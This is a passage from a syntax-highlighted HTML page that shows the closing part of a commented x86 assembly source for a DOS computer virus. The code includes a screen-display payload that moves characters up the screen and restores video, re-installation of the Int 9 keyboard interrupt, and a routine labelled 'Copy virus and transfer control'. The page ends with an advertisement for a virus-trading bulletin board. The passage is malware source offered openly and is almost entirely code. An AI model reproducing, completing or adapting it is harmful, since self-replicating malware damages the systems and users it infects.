    </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">          </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">80</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc0">         </span><span class="sc1">; End of line?</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">BP1040</span><span class="sc0">          </span><span class="sc1">; Branch if not</span><span class="sc0">
</span><span class="sc5">BP1070</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">           </span><span class="sc1">; Start of line</span><span class="sc0">
</span><span class="sc5">BP1080</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc5">DW0005</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">100H</span><span class="sc4">],</span><span class="sc2">80</span><span class="sc4">*</span><span class="sc2">25</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">; End of display area?</span><span class="sc0">
    </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">BP1140</span><span class="sc0">          </span><span class="sc1">; Branch if yes</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc5">FLENLO</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">100H</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get last line number</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Get current char and attributes</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">SIGNAT</span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">100H</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Is it the same as the stored copy?</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">BP1100</span><span class="sc0">          </span><span class="sc1">; Branch if not</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">
</span><span class="sc5">BP1090</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">           </span><span class="sc1">; First line?</span><span class="sc0">
    </span><span class="sc6">JZ</span><span class="sc0">  </span><span class="sc5">BP1120</span><span class="sc0">          </span><span class="sc1">; Restore video if yes</span><span class="sc0">
    </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">80</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc0">         </span><span class="sc1">; Previous line</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">SIGNAT</span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">100H</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Is this line same as current?</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">BP1090</span><span class="sc0">          </span><span class="sc1">; Branch if not</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Is this line the same</span><span class="sc0">
    </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">BP1090</span><span class="sc0">          </span><span class="sc1">; Branch if yes</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
</span><span class="sc5">BP1100</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">           </span><span class="sc1">; First line?</span><span class="sc0">
    </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc5">BP1110</span><span class="sc0">          </span><span class="sc1">; Character up one line if not</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc2">0720H</span><span class="sc0"> </span><span class="sc1">; White on black space</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">BP1130</span><span class="sc0">

    </span><span class="sc1">; Move character up one line</span><span class="sc0">

</span><span class="sc5">BP1110</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Get current char and attributes</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">0FF60H</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">   </span><span class="sc1">; Move to previous line</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc2">0720H</span><span class="sc0">  </span><span class="sc1">; White on black space</span><span class="sc0">
    </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc5">FLENLO</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">100H</span><span class="sc4">],</span><span class="sc2">80</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc0">    </span><span class="sc1">; Move last line number up one</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">DB0870</span><span class="sc4">+</span><span class="sc2">100H</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; Set characters going up</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">BP1140</span><span class="sc0">

    </span><span class="sc1">; Restore video</span><span class="sc0">

</span><span class="sc5">BP1120</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
</span><span class="sc5">BP1130</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc5">DW0005</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">100H</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get current line number</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">80</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc0">         </span><span class="sc1">; Next line</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">DW0005</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">100H</span><span class="sc4">],</span><span class="sc8">BX</span><span class="sc0">  </span><span class="sc1">; Save new current line number</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">FLENLO</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">100H</span><span class="sc4">],</span><span class="sc8">BX</span><span class="sc0">  </span><span class="sc1">; Save last line number</span><span class="sc0">
</span><span class="sc5">BP1140</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">          </span><span class="sc1">; \ Next character position</span><span class="sc0">
    </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">          </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">80</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc0">         </span><span class="sc1">; End of line?</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">BP1080</span><span class="sc0">          </span><span class="sc1">; Branch if not</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc5">DB0870</span><span class="sc4">+</span><span class="sc2">100H</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; Are characters going down</span><span class="sc0">
    </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">BP1150</span><span class="sc0">          </span><span class="sc1">; Branch if not</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DI</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">          </span><span class="sc1">; \ Set ES to DS</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">          </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">          </span><span class="sc1">; \ Set DS to CS</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">          </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">SIGNAT</span><span class="sc4">+</span><span class="sc2">100H</span><span class="sc0">   </span><span class="sc1">; From end of virus</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">DI</span><span class="sc0">           </span><span class="sc1">; To zero</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">80</span><span class="sc4">*</span><span class="sc2">25</span><span class="sc0">        </span><span class="sc1">; Length to copy</span><span class="sc0">
    </span><span class="sc6">REPZ</span><span class="sc0">    </span><span class="sc6">MOVSW</span><span class="sc0">           </span><span class="sc1">; Restore video</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">DSPCNT</span><span class="sc4">+</span><span class="sc2">100H</span><span class="sc4">,</span><span class="sc2">0FFDCH</span><span class="sc0">  </span><span class="sc1">; Restart display count (60 mins)</span><span class="sc0">
    </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc5">SWTCHB</span><span class="sc4">+</span><span class="sc2">100H</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">       </span><span class="sc1">; Set off all switches but three</span><span class="sc0">
    </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc5">SWTCHB</span><span class="sc4">+</span><span class="sc2">100H</span><span class="sc4">,</span><span class="sc2">88H</span><span class="sc0">     </span><span class="sc1">; Set on switches four and eight</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">RSTCNT</span><span class="sc4">+</span><span class="sc2">100H</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; Set restore count off</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">; \ Address zero</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc9">ASSUME</span><span class="sc0">  </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">BOOT</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">I09_OF</span><span class="sc4">+</span><span class="sc2">100H</span><span class="sc0">      </span><span class="sc1">; Get old Int 9 offset</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">BW0024</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">       </span><span class="sc1">; Re-install Int 9 offset</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">I09_SG</span><span class="sc4">+</span><span class="sc2">100H</span><span class="sc0">      </span><span class="sc1">; Get old Int 9 segment</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">BW0026</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">       </span><span class="sc1">; Re-install Int 9 segment</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
</span><span class="sc5">BP1150</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
    </span><span class="sc6">RET</span><span class="sc0">

    </span><span class="sc1">; Copy virus and transfer control</span><span class="sc0">

</span><span class="sc5">BP1160</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CLD</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">          </span><span class="sc1">; Recover return address</span><span class="sc0">
    </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">           </span><span class="sc1">; Subtract source offset</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">DI</span><span class="sc0">           </span><span class="sc1">; Add target offset</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">          </span><span class="sc1">; Push new segment</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">          </span><span class="sc1">; Push new return address</span><span class="sc0">
    </span><span class="sc6">REPZ</span><span class="sc0">    </span><span class="sc6">MOVSB</span><span class="sc0">           </span><span class="sc1">; Copy virus</span><span class="sc0">
    </span><span class="sc6">RETF</span><span class="sc0">                </span><span class="sc1">; Return to copy</span><span class="sc0">

    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">090H</span><span class="sc0">
</span><span class="sc5">SIGNAT</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0E850H</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0E2H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08BH</span><span class="sc0">

</span><span class="sc5">ENDADR</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc5">CODE</span><span class="sc0">    </span><span class="sc9">ENDS</span><span class="sc0">

    </span><span class="sc9">END</span><span class="sc0">

</span><span class="sc1">; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ</span><span class="sc0">
</span><span class="sc1">; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ&gt; and Remember Don't Forget to Call &lt;ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ</span><span class="sc0">
</span><span class="sc1">; ฤฤฤฤฤฤฤฤฤฤฤฤ&gt; ARRESTED DEVELOPMENT +31.79.426o79 H/P/A/V/AV/? &lt;ฤฤฤฤฤฤฤฤฤฤ</span><span class="sc0">
</span><span class="sc1">; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ</span><span class="sc0">

</span></div></body>
</html>
